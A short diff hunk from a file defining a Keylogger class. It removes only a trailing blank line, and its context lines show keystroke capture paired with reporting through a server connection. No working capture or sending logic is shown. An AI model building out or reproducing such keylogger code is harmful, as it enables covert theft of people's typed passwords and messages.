@@ -84,4 +84,3 @@ class Keylogger:
 		self.__report()
 		keyboard.wait()
 		self.__server.quit()
-
